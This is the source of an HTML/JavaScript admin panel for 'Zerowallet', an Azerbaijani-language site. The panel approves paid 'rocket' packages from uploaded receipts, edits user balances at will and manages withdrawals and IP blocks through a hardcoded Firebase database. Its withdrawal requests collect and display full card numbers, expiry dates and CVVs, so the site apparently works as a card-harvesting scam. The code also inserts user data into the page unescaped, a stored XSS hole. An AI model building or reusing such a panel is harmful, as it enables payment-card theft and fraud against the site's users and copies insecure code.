<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>Zerowallet | Admin Terminal v2.5</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
        h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
        .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.8rem; }
        td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.9rem; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; }
        .btn-block { background: #ff3e3e; color: white; }
        .btn-unblock { background: #00ff41; color: black; }
        .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
        .img-preview { width: 120px; height: 70px; object-fit: cover; border-radius: 5px; cursor: pointer; border: 1px solid var(--neon); transition: 0.3s; }
        .img-preview:hover { transform: scale(1.1); }
    </style>
</head>
<body>

<div class="container">
    <h1><i class="fas fa-terminal"></i> ADMIN SYSTEM</h1>

    <div class="sys-box">
        <h3 style="margin-top:0; color:var(--neon);"><i class="fas fa-power-off"></i> SİSTEM STATUSU</h3>
        <p id="status-text">Yüklənir...</p>
        <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
    </div>

    <h2><i class="fas fa-receipt"></i> GƏLƏN ÖDƏNİŞLƏR (ÇEKLƏR)</h2>
    <div class="table-wrap">
        <table>
            <thead><tr><th>İstifadəçi</th><th>Seçilən Roket</th><th>Çek Şəkli</th><th>Tarix</th><th>İdarəetmə</th></tr></thead>
            <tbody id="payment-body"></tbody>
        </table>
    </div>

    <h2><i class="fas fa-credit-card"></i> NAĞDLAŞDIRMA TƏLƏBLƏRİ</h2>
    <div class="table-wrap">
        <table>
            <thead><tr><th>İstifadəçi</th><th>Məbləğ</th><th>Kart Sahibi</th><th>Kart No/EXP/CVV</th><th>İdarəetmə</th></tr></thead>
            <tbody id="withdraw-body"></tbody>
        </table>
    </div>

    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ SİYAHISI</h2>
    <div class="table-wrap">
        <table>
            <thead><tr><th>Username</th><th>Balans (Kliklə)</th><th>IP Ünvanı</th><th>Status</th><th>İdarəetmə</th></tr></thead>
            <tbody id="user-body"></tbody>
        </table>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
        authDomain: "sevgili-testi.firebaseapp.com",
        databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
        projectId: "sevgili-testi",
        storageBucket: "sevgili-testi.firebasestorage.app",
        messagingSenderId: "399260477557",
        appId: "1:399260477557:web:584204a698d7bf145bb03c"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // SİSTEM STATUSU
    db.ref('settings/system_status').on('value', snap => {
        const status = snap.val();
        const btn = document.getElementById('toggle-sys-btn');
        const txt = document.getElementById('status-text');
        if (status === "active") {
            txt.innerHTML = `Sistem: <b style="color:#00ff41">AKTİV</b>`;
            btn.innerText = "SİSTEMİ BAĞLA (MAINTENANCE)";
            btn.className = "btn btn-block";
        } else {
            txt.innerHTML = `Sistem: <b style="color:#ff3e3e">BAĞLI</b>`;
            btn.innerText = "SİSTEMİ AÇ (ONLINE)";
            btn.className = "btn btn-unblock";
        }
    });

    function toggleSystem() {
        db.ref('settings/system_status').once('value', snap => {
            const next = snap.val() === "active" ? "maintenance" : "active";
            if(confirm("Sistem statusu dəyişdirilsin?")) db.ref('settings').update({ system_status: next });
        });
    }

    // ÇEKLƏRİ DİNLƏMƏK (admin_receipts)
    db.ref('admin_receipts').on('value', snap => {
        const body = document.getElementById('payment-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const d = child.val();
            const key = child.key;
            const date = new Date(d.timestamp).toLocaleString('az-AZ');
            body.innerHTML += `<tr>
                <td><b>${d.username}</b></td>
                <td><b style="color:var(--neon)">${d.rocket_type}</b></td>
                <td><img src="${d.receipt_url}" class="img-preview" onclick="window.open(this.src)"></td>
                <td><small>${date}</small></td>
                <td>
                    <button class="btn btn-unblock" onclick="approveRocket('${key}', '${d.username}', '${d.rocket_type}')">TƏSDİQLƏ</button>
                    <button class="btn btn-block" onclick="removeData('admin_receipts/${key}')">SİL</button>
                </td>
            </tr>`;
        });
    });

    function approveRocket(key, username, rocketType) {
        if(confirm(`${username} üçün ${rocketType} paketi aktiv edilsin?`)) {
            // İstifadəçinin rocket statusunu yenilə
            db.ref('zerowallet_users/' + username).update({ 
                rocket: rocketType.toLowerCase().replace(' pack', '') 
            }).then(() => {
                db.ref('admin_receipts/' + key).remove();
                alert("Ödəniş təsdiqləndi və roket aktiv edildi!");
            });
        }
    }

    // ÇIXARIŞLARI DİNLƏMƏK (admin_withdrawals)
    db.ref('admin_withdrawals').on('value', snap => {
        const body = document.getElementById('withdraw-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const d = child.val();
            const key = child.key;
            body.innerHTML += `<tr>
                <td><b>${d.username}</b></td>
                <td style="color:#00ff41">${d.amount} AZN</td>
                <td>${d.card_name}</td>
                <td><small>${d.card_num}<br>${d.card_exp} | ${d.card_cvv}</small></td>
                <td>
                    <button class="btn btn-unblock" onclick="approveWithdrawal('${key}', '${d.username}', ${d.amount})">ÖDƏNİLDİ</button>
                    <button class="btn btn-block" onclick="removeData('admin_withdrawals/${key}')">İMTİNA</button>
                </td>
            </tr>`;
        });
    });

    function approveWithdrawal(key, username, amount) {
        if(confirm(`${username} üçün çıxarış tamamlandı? Balansdan çıxılacaq.`)) {
            db.ref('zerowallet_users/' + username).once('value', snap => {
                const currentBal = snap.val().balance || 0;
                db.ref('zerowallet_users/' + username).update({ balance: Math.max(0, currentBal - amount) });
                db.ref('admin_withdrawals/' + key).remove();
            });
        }
    }

    // İSTİFADƏÇİ SİYAHISI
    db.ref('zerowallet_users').on('value', snap => {
        const body = document.getElementById('user-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const u = child.val();
            const cleanIp = (u.ip || "").replace(/\./g, '_');
            db.ref('blocked_ips/' + cleanIp).on('value', blockSnap => {
                const isBlocked = blockSnap.exists();
                const rowId = `row_${u.username}`;
                const rowHtml = `<tr id="${rowId}">
                    <td>${u.username}</td>
                    <td><span class="editable-balance" onclick="editBalance('${u.username}', ${u.balance})">${(u.balance || 0).toFixed(4)} AZN</span></td>
                    <td>${u.ip || '0.0.0.0'}</td>
                    <td>${isBlocked ? '<b style="color:red">BLOK</b>' : '<b style="color:green">AKTİV</b>'}</td>
                    <td><button class="btn ${isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="toggleBlock('${u.ip}', ${!isBlocked})">${isBlocked ? 'AÇ' : 'BLOKLA'}</button></td>
                </tr>`;
                let row = document.getElementById(rowId);
                if (row) row.outerHTML = rowHtml; else body.innerHTML += rowHtml;
            });
        });
    });

    function editBalance(username, current) {
        const val = prompt(`${username} üçün yeni balans:`, current);
        if (val !== null) db.ref('zerowallet_users/' + username).update({ balance: parseFloat(val) });
    }

    function toggleBlock(ip, status) {
        if(!ip) return;
        const cleanIp = ip.replace(/\./g, '_');
        if (status) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, date: Date.now() });
        else db.ref('blocked_ips/' + cleanIp).remove();
    }

    function removeData(path) {
        if(confirm("Məlumat silinsin?")) db.ref(path).remove();
    }
</script>
</body>
</html>
